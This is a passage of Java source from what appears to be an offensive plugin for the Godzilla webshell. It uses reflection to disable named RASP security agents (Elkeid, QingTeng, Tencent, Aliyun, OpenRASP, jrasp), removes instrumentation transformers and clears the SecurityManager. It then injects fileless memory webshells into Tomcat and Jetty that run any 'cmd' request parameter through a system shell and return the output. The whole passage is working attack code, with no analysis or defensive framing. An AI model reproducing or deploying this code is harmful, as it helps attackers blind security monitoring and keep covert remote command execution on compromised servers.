        return result.toString();
    }
    
    private String disableElkeid(String action) {
        StringBuilder result = new StringBuilder();
        result.append("[*] Elkeid (ByteDance) — best-effort reflection disable\n");
        int ok = 0;
        String[] agentClasses = new String[]{
            "com.bytedance.elkeid.agent.Agent",
            "com.bytedance.elkeid.agent.AgentStarter",
            "com.bytedance.elkeid.SmithAgent",
            "com.bytedance.elkeid.agent.SmithAgent"
        };
        for (String cn : agentClasses) {
            try {
                Class<?> c = Class.forName(cn);
                for (Field f : c.getDeclaredFields()) {
                    if (Modifier.isStatic(f.getModifiers()) && (f.getType() == boolean.class || f.getType() == Boolean.class)) {
                        try {
                            f.setAccessible(true);
                            stripFinalIfNeeded(f);
                            if (f.getType() == boolean.class) {
                                f.setBoolean(null, false);
                            } else {
                                f.set(null, Boolean.FALSE);
                            }
                            result.append("[+] ").append(cn).append(".").append(f.getName()).append(" = false\n");
                            ok++;
                        } catch (Exception ignored) {
                        }
                    }
                }
            } catch (ClassNotFoundException ignored) {
            }
        }
        try {
            Class<?> hook = Class.forName("com.bytedance.elkeid.hook.HookManager");
            for (Field f : hook.getDeclaredFields()) {
                if (f.getType() == boolean.class || f.getType() == Boolean.class) {
                    try {
                        f.setAccessible(true);
                        stripFinalIfNeeded(f);
                        if (f.getType() == boolean.class) {
                            f.setBoolean(null, false);
                        } else {
                            f.set(null, Boolean.FALSE);
                        }
                        result.append("[+] HookManager.").append(f.getName()).append(" = false\n");
                        ok++;
                    } catch (Exception ignored) {
                    }
                }
            }
        } catch (ClassNotFoundException ignored) {
        }
        if (ok == 0) {
            result.append("[-] No Elkeid classes/fields matched this build; agent version may differ\n");
        } else {
            result.append("[+] Elkeid disable attempts: ").append(ok).append("\n");
        }
        return result.toString();
    }
    
    private static void stripFinalIfNeeded(Field f) {
        try {
            Field mf = Field.class.getDeclaredField("modifiers");
            mf.setAccessible(true);
            mf.setInt(f, f.getModifiers() & ~Modifier.FINAL);
        } catch (Exception ignored) {
        }
    }
    
    // ==================== QingTeng RASP Disable ====================
    
    private String disableQingTeng(String action) {
        StringBuilder result = new StringBuilder();
        result.append("[*] Attempting to disable QingTeng RASP...\n");
        
        try {
            // Method 1: Disable via AgentBootstrap.enabled
            try {
                Class<?> agentBootstrapClass = Class.forName("com.qingteng.rasp.agent.AgentBootstrap");
                Field enabledField = getDeclaredField(agentBootstrapClass, "enabled");
                enabledField.setAccessible(true);
                
                Field modifiersField = getDeclaredField(Field.class, "modifiers");
                modifiersField.setAccessible(true);
                modifiersField.setInt(enabledField, enabledField.getModifiers() & ~Modifier.FINAL);
                
                enabledField.set(null, false);
                result.append("[+] QingTeng AgentBootstrap.enabled set to false\n");
            } catch (Exception e) {
                result.append("[-] Method 1 failed: " + e.getMessage() + "\n");
            }
            
            // Method 2: Disable via HookManager
            try {
                Class<?> hookManagerClass = Class.forName("com.qingteng.rasp.hook.HookManager");
                Field hookEnabledField = getDeclaredField(hookManagerClass, "hookEnabled");
                hookEnabledField.setAccessible(true);
                
                Field modifiersField = getDeclaredField(Field.class, "modifiers");
                modifiersField.setAccessible(true);
                modifiersField.setInt(hookEnabledField, hookEnabledField.getModifiers() & ~Modifier.FINAL);
                
                hookEnabledField.set(null, false);
                result.append("[+] QingTeng HookManager.hookEnabled set to false\n");
            } catch (Exception e) {
                result.append("[-] Method 2 failed: " + e.getMessage() + "\n");
            }
            
            // Method 3: Disable via Config
            try {
                Class<?> configClass = Class.forName("com.qingteng.rasp.config.RaspConfig");
                Method getInstanceMethod = configClass.getMethod("getInstance");
                Object configInstance = getInstanceMethod.invoke(null);
                
                Field disableField = getDeclaredField(configClass, "disableAll");
                disableField.setAccessible(true);
                disableField.set(configInstance, true);
                result.append("[+] QingTeng RaspConfig.disableAll set to true\n");
            } catch (Exception e) {
                result.append("[-] Method 3 failed: " + e.getMessage() + "\n");
            }
            
            // Method 4: Clear transformers
            try {
                Class<?> transformerClass = Class.forName("com.qingteng.rasp.transformer.RaspTransformer");
                Field instanceField = getDeclaredField(transformerClass, "instance");
                instanceField.setAccessible(true);
                Object transformerInstance = instanceField.get(null);
                
                if (transformerInstance != null) {
                    Field disabledField = transformerInstance.getClass().getDeclaredField("disabled");
                    disabledField.setAccessible(true);
                    disabledField.set(transformerInstance, true);
                    result.append("[+] QingTeng Transformer disabled\n");
                }
            } catch (Exception e) {
                result.append("[-] Method 4 failed: " + e.getMessage() + "\n");
            }
            
            result.append("[+] QingTeng RASP disable completed!\n");
            
        } catch (Exception e) {
            result.append("[-] Error: " + e.getMessage() + "\n");
        }
        
        return result.toString();
    }
    
    // ==================== Tencent RASP Disable ====================
    
    private String disableTencentRasp(String action) {
        StringBuilder result = new StringBuilder();
        result.append("[*] Attempting to disable Tencent RASP...\n");
        
        try {
            // Method 1: Disable via RaspAgent
            try {
                Class<?> raspAgentClass = Class.forName("com.tencent.rasp.agent.RaspAgent");
                Field enabledField = getDeclaredField(raspAgentClass, "enabled");
                enabledField.setAccessible(true);
                
                Field modifiersField = getDeclaredField(Field.class, "modifiers");
                modifiersField.setAccessible(true);
                modifiersField.setInt(enabledField, enabledField.getModifiers() & ~Modifier.FINAL);
                
                enabledField.set(null, false);
                result.append("[+] Tencent RaspAgent.enabled set to false\n");
            } catch (Exception e) {
                result.append("[-] Method 1 failed: " + e.getMessage() + "\n");
            }
            
            // Method 2: Disable via HookHandler
            try {
                Class<?> hookHandlerClass = Class.forName("com.tencent.rasp.hook.HookHandler");
                Field hookSwitchField = getDeclaredField(hookHandlerClass, "hookSwitch");
                hookSwitchField.setAccessible(true);
                
                Object hookSwitch = hookSwitchField.get(null);
                if (hookSwitch instanceof AtomicBoolean) {
                    ((AtomicBoolean) hookSwitch).set(false);
                    result.append("[+] Tencent HookHandler.hookSwitch set to false\n");
                }
            } catch (Exception e) {
                result.append("[-] Method 2 failed: " + e.getMessage() + "\n");
            }
            
            // Method 3: Disable via Config
            try {
                Class<?> configClass = Class.forName("com.tencent.rasp.config.RaspConfiguration");
                Method getInstanceMethod = configClass.getMethod("getInstance");
                Object configInstance = getInstanceMethod.invoke(null);
                
                Field enableHookField = getDeclaredField(configClass, "enableHook");
                enableHookField.setAccessible(true);
                enableHookField.set(configInstance, false);
                result.append("[+] Tencent RaspConfiguration.enableHook set to false\n");
            } catch (Exception e) {
                result.append("[-] Method 3 failed: " + e.getMessage() + "\n");
            }
            
            result.append("[+] Tencent RASP disable completed!\n");
            
        } catch (Exception e) {
            result.append("[-] Error: " + e.getMessage() + "\n");
        }
        
        return result.toString();
    }
    
    // ==================== Aliyun RASP Disable ====================
    
    private String disableAliyunRasp(String action) {
        StringBuilder result = new StringBuilder();
        result.append("[*] Attempting to disable Aliyun RASP...\n");
        
        try {
            // Method 1: Disable via AgentMain
            try {
                Class<?> agentMainClass = Class.forName("com.aliyun.rasp.agent.AgentMain");
                Field agentEnabledField = getDeclaredField(agentMainClass, "agentEnabled");
                agentEnabledField.setAccessible(true);
                
                Field modifiersField = getDeclaredField(Field.class, "modifiers");
                modifiersField.setAccessible(true);
                modifiersField.setInt(agentEnabledField, agentEnabledField.getModifiers() & ~Modifier.FINAL);
                
                agentEnabledField.set(null, false);
                result.append("[+] Aliyun AgentMain.agentEnabled set to false\n");
            } catch (Exception e) {
                result.append("[-] Method 1 failed: " + e.getMessage() + "\n");
            }
            
            // Method 2: Disable via HookProxy
            try {
                Class<?> hookProxyClass = Class.forName("com.aliyun.rasp.hook.HookProxy");
                Field enabledField = getDeclaredField(hookProxyClass, "enabled");
                enabledField.setAccessible(true);
                
                Object enabled = enabledField.get(null);
                if (enabled instanceof AtomicBoolean) {
                    ((AtomicBoolean) enabled).set(false);
                    result.append("[+] Aliyun HookProxy.enabled set to false\n");
                }
            } catch (Exception e) {
                result.append("[-] Method 2 failed: " + e.getMessage() + "\n");
            }
            
            // Method 3: Disable via Config
            try {
                Class<?> configClass = Class.forName("com.aliyun.rasp.config.RaspConfig");
                Method getInstanceMethod = configClass.getMethod("getInstance");
                Object configInstance = getInstanceMethod.invoke(null);
                
                Field hookEnabledField = getDeclaredField(configClass, "hookEnabled");
                hookEnabledField.setAccessible(true);
                hookEnabledField.set(configInstance, false);
                result.append("[+] Aliyun RaspConfig.hookEnabled set to false\n");
            } catch (Exception e) {
                result.append("[-] Method 3 failed: " + e.getMessage() + "\n");
            }
            
            // Method 4: Clear SecurityListener
            try {
                Class<?> listenerClass = Class.forName("com.aliyun.rasp.security.SecurityListener");
                Field instanceField = getDeclaredField(listenerClass, "instance");
                instanceField.setAccessible(true);
                instanceField.set(null, null);
                result.append("[+] Aliyun SecurityListener.instance cleared\n");
            } catch (Exception e) {
                result.append("[-] Method 4 failed: " + e.getMessage() + "\n");
            }
            
            result.append("[+] Aliyun RASP disable completed!\n");
            
        } catch (Exception e) {
            result.append("[-] Error: " + e.getMessage() + "\n");
        }
        
        return result.toString();
    }
    
    // ==================== Universal RASP Disable for All Known RASP ====================
    
    private String disableAllKnownRasp() {
        StringBuilder result = new StringBuilder();
        result.append("[*] Attempting to disable ALL known RASP products...\n\n");
        
        result.append(disableOpenRasp("disableHook"));
        result.append(disableOpenRasp("modifyConfig"));
        result.append(disableJrasp("disableHook"));
        result.append(disableElkeid("disableHook"));
        result.append(disableQingTeng("disableHook"));
        result.append(disableTencentRasp("disableHook"));
        result.append(disableAliyunRasp("disableHook"));
        
        return result.toString();
    }
    
    private String disableGenericRasp() {
        StringBuilder result = new StringBuilder();
        result.append("[*] Attempting generic RASP disable methods...\n\n");
        
        result.append(disableOpenRasp("disableHook"));
        result.append(disableJrasp("disableHook"));
        result.append(disableElkeid("disableHook"));
        result.append(disableAllInstrumentation());
        result.append(disableAllClassTransformers());
        result.append(clearSecurityManager());
        
        return result.toString();
    }
    
    // ==================== Advanced RASP Disable Methods ====================
    
    private String disableAllInstrumentation() {
        StringBuilder result = new StringBuilder();
        result.append("[*] Attempting to disable all Instrumentation...\n");
        
        try {
            Thread[] threads = getAllThreads();
            for (Thread thread : threads) {
                if (thread != null) {
                    ClassLoader cl = thread.getContextClassLoader();
                    if (cl != null) {
                        try {
                            Class<?> instClass = cl.loadClass("java.lang.instrument.Instrumentation");
                            result.append("[+] Found Instrumentation class in: " + cl + "\n");
                        } catch (ClassNotFoundException ignored) {
                        }
                    }
                }
            }
            
            result.append("[+] Instrumentation scan completed\n");
        } catch (Exception e) {
            result.append("[-] Error: " + e.getMessage() + "\n");
        }
        
        return result.toString();
    }
    
    private String disableAllClassTransformers() {
        StringBuilder result = new StringBuilder();
        result.append("[*] Attempting to remove all ClassFileTransformers...\n");
        
        try {
            Class<?> instrumentationImplClass = Class.forName("sun.instrument.InstrumentationImpl");
            Field mTransformerManagerField = getDeclaredField(instrumentationImplClass, "mTransformerManager");
            mTransformerManagerField.setAccessible(true);
            
            Thread currentThread = Thread.currentThread();
            ClassLoader loader = currentThread.getContextClassLoader();
            
            java.lang.instrument.Instrumentation instrumentation = getInstrumentationInstance();
            if (instrumentation != null) {
                Object transformerManager = mTransformerManagerField.get(instrumentation);
                if (transformerManager != null) {
                    Field mTransformersField = transformerManager.getClass().getDeclaredField("mTransformers");
                    mTransformersField.setAccessible(true);
                    List<?> transformers = (List<?>) mTransformersField.get(transformerManager);
                    
                    if (transformers != null) {
                        result.append("[*] Found " + transformers.size() + " transformers\n");
                        transformers.clear();
                        result.append("[+] All transformers removed!\n");
                    }
                }
            }
        } catch (Exception e) {
            result.append("[-] Error: " + e.getMessage() + "\n");
        }
        
        return result.toString();
    }
    
    private String clearSecurityManager() {
        StringBuilder result = new StringBuilder();
        result.append("[*] Attempting to clear SecurityManager...\n");
        
        try {
            SecurityManager currentSm = System.getSecurityManager();
            if (currentSm != null) {
                result.append("[*] Current SecurityManager: " + currentSm.getClass().getName() + "\n");
                
                try {
                    System.setSecurityManager(null);
                    result.append("[+] SecurityManager cleared!\n");
                } catch (SecurityException e) {
                    result.append("[!] Direct clear failed, trying reflection...\n");
                    
                    Field securityField = System.class.getDeclaredField("security");
                    securityField.setAccessible(true);
                    securityField.set(null, null);
                    result.append("[+] SecurityManager cleared via reflection!\n");
                }
            } else {
                result.append("[+] No SecurityManager set\n");
            }
        } catch (Exception e) {
            result.append("[-] Error: " + e.getMessage() + "\n");
        }
        
        return result.toString();
    }
    
    // ==================== RASP Uninstall Methods ====================
    
    public byte[] uninstallRasp() {
        StringBuilder result = new StringBuilder();
        result.append("=== RASP Uninstall Attempt ===\n\n");
        
        result.append(uninstallViaAgent());
        result.append(uninstallViaClassLoader());
        result.append(uninstallViaTransformerRemoval());
        
        return result.toString().getBytes();
    }
    
    private String uninstallViaAgent() {
        StringBuilder result = new StringBuilder();
        result.append("[*] Attempting to uninstall RASP via Agent API...\n");
        
        try {
            String pid = getProcessId();
            result.append("[*] Current PID: " + pid + "\n");
            
            String javaHome = System.getProperty("java.home");
            String toolsJar = javaHome + File.separator + "lib" + File.separator + "tools.jar";
            
            File toolsJarFile = new File(toolsJar);
            if (!toolsJarFile.exists()) {
                result.append("[-] tools.jar not found at: " + toolsJar + "\n");
                result.append("[*] Trying alternative locations...\n");
                
                String javaHomeEnv = System.getenv("JAVA_HOME");
                if (javaHomeEnv != null) {
                    toolsJar = javaHomeEnv + File.separator + "lib" + File.separator + "tools.jar";
                    toolsJarFile = new File(toolsJar);
                }
            }
            
            if (toolsJarFile.exists()) {
                result.append("[+] Found tools.jar: " + toolsJar + "\n");
                
                java.net.URL toolsUrl = toolsJarFile.toURI().toURL();
                java.net.URLClassLoader loader = new java.net.URLClassLoader(new java.net.URL[]{toolsUrl});
                
                Class<?> vmClass = loader.loadClass("com.sun.tools.attach.VirtualMachine");
                Method attachMethod = vmClass.getMethod("attach", String.class);
                Object vm = attachMethod.invoke(null, pid);
                
                result.append("[+] Attached to VM: " + vm + "\n");
                
                Method loadAgentMethod = vmClass.getMethod("loadAgent", String.class);
                result.append("[*] In production, would load uninstall agent here\n");
                
                Method detachMethod = vmClass.getMethod("detach");
                detachMethod.invoke(vm);
                
                result.append("[+] Agent uninstall placeholder completed\n");
            } else {
                result.append("[-] tools.jar not available for Attach API\n");
            }
        } catch (Exception e) {
            result.append("[-] Error: " + e.getMessage() + "\n");
        }
        
        return result.toString();
    }
    
    private String uninstallViaClassLoader() {
        StringBuilder result = new StringBuilder();
        result.append("[*] Attempting to unload RASP via ClassLoader...\n");
        
        try {
            Thread[] threads = getAllThreads();
            Map<ClassLoader, Set<Class<?>>> loaderClasses = new HashMap<>();
            
            for (Thread thread : threads) {
                ClassLoader cl = thread.getContextClassLoader();
                if (cl != null && !loaderClasses.containsKey(cl)) {
                    Set<Class<?>> raspClasses = findRaspClasses(cl);
                    if (!raspClasses.isEmpty()) {
                        loaderClasses.put(cl, raspClasses);
                    }
                }
            }
            
            for (Map.Entry<ClassLoader, Set<Class<?>>> entry : loaderClasses.entrySet()) {
                result.append("[*] Found RASP classes in ClassLoader: " + entry.getKey() + "\n");
                for (Class<?> clazz : entry.getValue()) {
                    result.append("  - " + clazz.getName() + "\n");
                }
            }
            
            result.append("[*] ClassLoader analysis completed\n");
            result.append("[!] Note: Unloading classes requires GC and is not guaranteed\n");
            
        } catch (Exception e) {
            result.append("[-] Error: " + e.getMessage() + "\n");
        }
        
        return result.toString();
    }
    
    private String uninstallViaTransformerRemoval() {
        StringBuilder result = new StringBuilder();
        result.append("[*] Attempting to remove RASP transformers...\n");
        
        try {
            java.lang.instrument.Instrumentation instrumentation = getInstrumentationInstance();
            
            if (instrumentation != null) {
                Class<?>[] allLoadedClasses = instrumentation.getAllLoadedClasses();
                result.append("[*] Total loaded classes: " + allLoadedClasses.length + "\n");
                
                int raspClassCount = 0;
                for (Class<?> clazz : allLoadedClasses) {
                    String className = clazz.getName();
                    if (isBenignGodzillaRaspPluginClass(className)) {
                        continue;
                    }
                    if (className.contains("rasp") || className.contains("Rasp") || 
                        className.contains("RASP") || className.contains("hook")) {
                        raspClassCount++;
                        result.append("  - RASP class: " + className + "\n");
                    }
                }
                
                result.append("[*] Found " + raspClassCount + " potential RASP classes\n");
                
                result.append(disableAllClassTransformers());
            } else {
                result.append("[-] Could not get Instrumentation instance\n");
            }
        } catch (Exception e) {
            result.append("[-] Error: " + e.getMessage() + "\n");
        }
        
        return result.toString();
    }
    
    // ==================== Universal RASP Disable ====================
    
    public byte[] universalRaspDisable() {
        StringBuilder result = new StringBuilder();
        result.append("=== Universal RASP Disable ===\n\n");
        
        result.append("[Phase 1] Attempting known RASP disables...\n");
        result.append(disableOpenRasp("disableHook"));
        result.append(disableOpenRasp("modifyConfig"));
        result.append(disableJrasp("disableHook"));
        result.append(disableElkeid("disableHook"));
        
        result.append("\n[Phase 2] Clearing SecurityManager...\n");
        result.append(clearSecurityManager());
        
        result.append("\n[Phase 3] Removing transformers...\n");
        result.append(disableAllClassTransformers());
        
        result.append("\n[Phase 4] Setting up bypass hooks...\n");
        result.append(setupBypassHooks());
        
        result.append("\n[+] Universal disable completed!\n");
        
        return result.toString().getBytes();
    }
    
    private String setupBypassHooks() {
        StringBuilder result = new StringBuilder();
        result.append("[*] Phase 4: local bypass prep (no subprocess)\n");
        try {
            Field theUnsafeField = sun.misc.Unsafe.class.getDeclaredField("theUnsafe");
            theUnsafeField.setAccessible(true);
            if (theUnsafeField.get(null) instanceof sun.misc.Unsafe) {
                result.append("[+] Unsafe available for advanced paths (Unsafe/forkAndExec)\n");
            }
        } catch (Exception e) {
            result.append("[-] Unsafe unavailable: ").append(e.getMessage()).append("\n");
        }
        return result.toString();
    }
    
    // ==================== Helper Methods ====================
    
    private Thread[] getAllThreads() {
        try {
            ThreadGroup rootGroup = Thread.currentThread().getThreadGroup();
            while (rootGroup.getParent() != null) {
                rootGroup = rootGroup.getParent();
            }
            
            Thread[] threads = new Thread[rootGroup.activeCount() * 2];
            rootGroup.enumerate(threads);
            return threads;
        } catch (Exception e) {
            return new Thread[0];
        }
    }
    
    private Set<Class<?>> findRaspClasses(ClassLoader loader) {
        Set<Class<?>> raspClasses = new HashSet<>();
        String[] raspKeywords = {"rasp", "Rasp", "RASP", "hook", "instrument", "transformer"};
        
        try {
            java.lang.instrument.Instrumentation instrumentation = getInstrumentationInstance();
            if (instrumentation != null) {
                Class<?>[] allClasses = instrumentation.getAllLoadedClasses();
                for (Class<?> clazz : allClasses) {
                    if (clazz.getClassLoader() == loader) {
                        String name = clazz.getName();
                        for (String keyword : raspKeywords) {
                            if (name.contains(keyword)) {
                                raspClasses.add(clazz);
                                break;
                            }
                        }
                    }
                }
            }
        } catch (Exception ignored) {
        }
        
        return raspClasses;
    }
    
    private java.lang.instrument.Instrumentation getInstrumentationInstance() {
        try {
            Class<?> instrumentationImplClass = Class.forName("sun.instrument.InstrumentationImpl");
            
            Thread[] threads = getAllThreads();
            for (Thread thread : threads) {
                ClassLoader cl = thread.getContextClassLoader();
                if (cl != null) {
                    try {
                        Class<?> instClass = cl.loadClass("java.lang.instrument.Instrumentation");
                        java.lang.reflect.Field[] fields = instrumentationImplClass.getDeclaredFields();
                        for (java.lang.reflect.Field field : fields) {
                            if (java.lang.instrument.Instrumentation.class.isAssignableFrom(field.getType())) {
                                field.setAccessible(true);
                                return (java.lang.instrument.Instrumentation) field.get(null);
                            }
                        }
                    } catch (Exception ignored) {
                    }
                }
            }
        } catch (Exception ignored) {
        }
        return null;
    }
    
    private String getProcessId() {
        try {
            String runtimeName = java.lang.management.ManagementFactory.getRuntimeMXBean().getName();
            return runtimeName.split("@")[0];
        } catch (Exception e) {
            return "-1";
        }
    }
    
    private void disableRaspHooks() {
        try {
            Class<?> hookHandlerClass = Class.forName("com.baidu.openrasp.HookHandler");
            StringBuilder sb = new StringBuilder();
            tryInvokeNoArgStatic(hookHandlerClass, "disableHook", sb);
            openRaspSetEnableHookFalse(hookHandlerClass, sb);
        } catch (Exception ignored) {
        }
    }
    
    // ==================== Memory Shell Injection ====================
    
    public byte[] injectMemShell() {
        String shellType = getString("shellType");
        String urlPath = getString("urlPath");
        
        StringBuilder result = new StringBuilder();
        result.append("=== Memory Shell Injection ===\n");
        result.append("Type: " + shellType + "\n");
        result.append("Path: " + urlPath + "\n\n");
        
        try {
            if (shellType.contains("Tomcat Filter")) {
                result.append(injectTomcatFilter(urlPath));
            } else if (shellType.contains("Tomcat Servlet")) {
                result.append(injectTomcatServlet(urlPath));
            } else if (shellType.contains("Tomcat Listener")) {
                result.append(injectTomcatListenerMem(urlPath));
            } else if (shellType.contains("Jetty")) {
                result.append(injectJettyFilterAttempt(urlPath));
            } else if (shellType.contains("Spring Controller")) {
                result.append(injectSpringController(urlPath));
            } else if (shellType.contains("VM Anonymous")) {
                result.append(injectVmAnonymousClass(urlPath));
            } else {
                result.append("[-] Unsupported shell type: " + shellType + "\n");
            }
        } catch (Exception e) {
            result.append("[-] Error: " + e.getMessage() + "\n");
        }
        
        return result.toString().getBytes();
    }

    private String memShellFilterName(String urlPath) {
        int h = urlPath != null ? urlPath.hashCode() : 0;
        return MEM_FILTER_PREFIX + Integer.toHexString(h);
    }
    
    private Object memShellGetServletContext() {
        try {
            if (this.servletRequest != null) {
                return this.servletRequest.getClass().getMethod("getServletContext").invoke(this.servletRequest);
            }
        } catch (Exception ignored) {
        }
        return null;
    }
    
    private Object memShellGetStandardContext(Object servletContext) {
        if (servletContext == null) {
            return null;
        }
        try {
            Field contextField = servletContext.getClass().getDeclaredField("context");
            contextField.setAccessible(true);
            Object context = contextField.get(servletContext);
            if (context != null) {
                try {
                    Field inner = context.getClass().getDeclaredField("context");
                    inner.setAccessible(true);
                    return inner.get(context);
                } catch (Exception ignored) {
                }
            }
        } catch (Exception ignored) {
        }
        try {
            Field contextField = servletContext.getClass().getDeclaredField("context");
            contextField.setAccessible(true);
            return contextField.get(servletContext);
        } catch (Exception ignored) {
        }
        return null;
    }
    
    private static Class<?> memShellServletApi(String javaxName, String jakartaName) {
        try {
            return Class.forName(javaxName);
        } catch (ClassNotFoundException e) {
            try {
                return Class.forName(jakartaName);
            } catch (ClassNotFoundException e2) {
                return null;
            }
        }
    }
    
    private String injectTomcatFilter(String urlPath) {
        StringBuilder result = new StringBuilder();
        String filterName = memShellFilterName(urlPath);
        String base = (urlPath != null && !urlPath.trim().isEmpty()) ? urlPath.trim() : "/rasp_bypass_shell";
        if (!base.startsWith("/")) {
            base = "/" + base;
        }
        final String urlPat = base.endsWith("/*") ? base : base + "/*";
        
        try {
            Object sc = memShellGetServletContext();
            if (sc == null) {
                result.append("[-] No ServletContext (need live HTTP request / servletRequest injected)\n");
                return result.toString();
            }
            Object standardContext = memShellGetStandardContext(sc);
            if (standardContext == null) {
                result.append("[-] StandardContext not found (not Tomcat or unsupported ApplicationContext)\n");
                return result.toString();
            }
            
            final Class<?> filterIfc = memShellServletApi("javax.servlet.Filter", "jakarta.servlet.Filter");
            if (filterIfc == null) {
                result.append("[-] javax/jakarta.servlet.Filter missing\n");
                return result.toString();
            }
            
            ClassLoader proxyCl = filterIfc.getClassLoader();
            if (proxyCl == null) {
                proxyCl = Thread.currentThread().getContextClassLoader();
            }
            
            InvocationHandler filterHandler = new InvocationHandler() {
                @Override
                public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
                    String mn = method.getName();
                    if ("init".equals(mn) || "destroy".equals(mn)) {
                        return null;
                    }
                    if (!"doFilter".equals(mn) || args == null || args.length < 3) {
                        return null;
                    }
                    Object req = args[0];
                    Object res = args[1];
                    Object chain = args[2];
                    try {
                        String cmd = (String) req.getClass().getMethod("getParameter", String.class).invoke(req, "cmd");
                        if (cmd != null && !cmd.trim().isEmpty()) {
                            String[] command = System.getProperty("os.name").toLowerCase().contains("win")
                                ? new String[]{"cmd.exe", "/c", cmd.trim()}
                                : new String[]{"/bin/sh", "-c", cmd.trim()};
                            ProcessBuilder pb = new ProcessBuilder(command);
                            pb.redirectErrorStream(true);
                            Process p = pb.start();
                            ByteArrayOutputStream bos = new ByteArrayOutputStream();
                            byte[] buf = new byte[4096];
                            int n;
                            InputStream in = p.getInputStream();
                            while ((n = in.read(buf)) != -1) {
                                bos.write(buf, 0, n);
                            }
                            p.waitFor(60, TimeUnit.SECONDS);
                            try {
                                res.getClass().getMethod("setCharacterEncoding", String.class).invoke(res, "UTF-8");
                            } catch (Exception ignored) {
                            }
                            try {
                                res.getClass().getMethod("setContentType", String.class).invoke(res, "text/plain;charset=UTF-8");
                            } catch (Exception ignored) {
                            }
                            try {
                                Object writer = res.getClass().getMethod("getWriter").invoke(res);
                                writer.getClass().getMethod("write", String.class).invoke(writer, new String(bos.toByteArray(), "UTF-8"));
                            } catch (Exception wex) {
                                Object os = res.getClass().getMethod("getOutputStream").invoke(res);
                                Method write = os.getClass().getMethod("write", byte[].class);
                                write.invoke(os, bos.toByteArray());
                            }
                            return null;
                        }
                    } catch (Exception ignored) {
                    }
                    for (Method m : chain.getClass().getMethods()) {
                        if ("doFilter".equals(m.getName()) && m.getParameterCount() == 2) {
                            m.invoke(chain, req, res);
                            break;
                        }
                    }
                    return null;
                }
            };
            
            Object filterProxy = Proxy.newProxyInstance(proxyCl, new Class<?>[]{filterIfc}, filterHandler);
            
            Class<?> filterDefClass = Class.forName("org.apache.tomcat.util.descriptor.web.FilterDef");
            Object filterDef = filterDefClass.getConstructor().newInstance();
            filterDefClass.getMethod("setFilterName", String.class).invoke(filterDef, filterName);
            try {
                Method setF = filterDefClass.getMethod("setFilter", filterIfc);
                setF.invoke(filterDef, filterProxy);
            } catch (NoSuchMethodException e) {
                filterDefClass.getMethod("setFilter", Object.class).invoke(filterDef, filterProxy);
            }
            
            standardContext.getClass().getMethod("addFilterDef", filterDefClass).invoke(standardContext, filterDef);
            
            Class<?> filterMapClass = Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap");
            Object filterMap = filterMapClass.getConstructor().newInstance();
            filterMapClass.getMethod("setFilterName", String.class).invoke(filterMap, filterName);
            filterMapClass.getMethod("addURLPattern", String.class).invoke(filterMap, urlPat);
            
            standardContext.getClass().getMethod("addFilterMap", filterMapClass).invoke(standardContext, filterMap);
            
            try {
                Method filterStart = standardContext.getClass().getMethod("filterStart");
                filterStart.invoke(standardContext);
            } catch (Exception ignored) {
            }
            
            result.append("[+] Tomcat Filter registered: ").append(filterName).append("\n");
            result.append("[+] URL pattern: ").append(urlPat).append("\n");
            result.append("[+] Try: ").append(base.replace("/*", "")).append("?cmd=whoami\n");
        } catch (Throwable e) {
            result.append("[-] injectTomcatFilter: ").append(e.getMessage()).append("\n");
            result.append(getStackTrace(e));
        }
        return result.toString();
    }
    
    private String injectTomcatListenerMem(String urlPath) {
        StringBuilder result = new StringBuilder();
        try {
            Object sc = memShellGetServletContext();
            if (sc == null) {
                result.append("[-] No ServletContext\n");
                return result.toString();
            }
            Object standardContext = memShellGetStandardContext(sc);
            if (standardContext == null) {
                result.append("[-] StandardContext not found\n");
                return result.toString();
            }
            
            final Class<?> listenerIfc = memShellServletApi(
                "javax.servlet.ServletRequestListener", "jakarta.servlet.ServletRequestListener");
            if (listenerIfc == null) {
                result.append("[-] ServletRequestListener API missing\n");
                return result.toString();
            }
            
            ClassLoader cl = listenerIfc.getClassLoader();
            if (cl == null) {
                cl = Thread.currentThread().getContextClassLoader();
            }
            
            InvocationHandler ih = new InvocationHandler() {
                @Override
                public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
                    if (!"requestInitialized".equals(method.getName()) || args == null || args.length < 1) {
                        return null;
                    }
                    try {
                        Object event = args[0];
                        Object req = event.getClass().getMethod("getServletRequest").invoke(event);
                        String cmd = (String) req.getClass().getMethod("getParameter", String.class).invoke(req, "cmd");
                        if (cmd != null && !cmd.trim().isEmpty()) {
                            String[] command = System.getProperty("os.name").toLowerCase().contains("win")
                                ? new String[]{"cmd.exe", "/c", cmd.trim()}
                                : new String[]{"/bin/sh", "-c", cmd.trim()};
                            ProcessBuilder pb = new ProcessBuilder(command);
                            pb.redirectErrorStream(true);
                            Process p = pb.start();
                            ByteArrayOutputStream bos = new ByteArrayOutputStream();
                            byte[] buf = new byte[4096];
                            int n;
                            while ((n = p.getInputStream().read(buf)) != -1) {
                                bos.write(buf, 0, n);
                            }
                            p.waitFor(60, TimeUnit.SECONDS);
                        }
                    } catch (Exception ignored) {
                    }
                    return null;
                }
            };
            
            Object listener = Proxy.newProxyInstance(cl, new Class<?>[]{listenerIfc}, ih);
            standardContext.getClass().getMethod("addApplicationEventListener", Object.class).invoke(standardContext, listener);
            result.append("[+] ServletRequestListener registered (cmd via request param on each request)\n");
            result.append("[!] Output not written to browser from listener alone; use Tomcat Filter for full echo\n");
        } catch (Throwable e) {
            result.append("[-] injectTomcatListenerMem: ").append(e.getMessage()).append("\n");
        }
        return result.toString();
    }
    
    private String injectJettyFilterAttempt(String urlPath) {
        StringBuilder sb = new StringBuilder();
        sb.append("[*] Jetty: attempting WebAppContext lookup...\n");
        try {
            Object sc = memShellGetServletContext();
            if (sc == null) {
                sb.append("[-] No ServletContext\n");
                return sb.toString();
            }
            Object handler = null;
            for (String fn : new String[]{"getContextHandler", "getCoreContextHandler"}) {
                try {
                    Method m = sc.getClass().getMethod(fn);
                    handler = m.invoke(sc);
                    if (handler != null) {
                        break;
                    }
                } catch (Exception ignored) {
                }
            }
            if (handler == null) {
                sb.append("[-] Could not get Jetty ContextHandler from ServletContext\n");
                return sb.toString();
            }
            sb.append("[+] Handler: ").append(handler.getClass().getName()).append("\n");
            
            Object servletHandler = null;
            try {
                Method gsm = handler.getClass().getMethod("getServletHandler");
                servletHandler = gsm.invoke(handler);
            } catch (Exception ignored) {
            }
            if (servletHandler == null) {
                sb.append("[-] getServletHandler() unavailable (not Jetty WebAppContext?)\n");
                return sb.toString();
            }
            
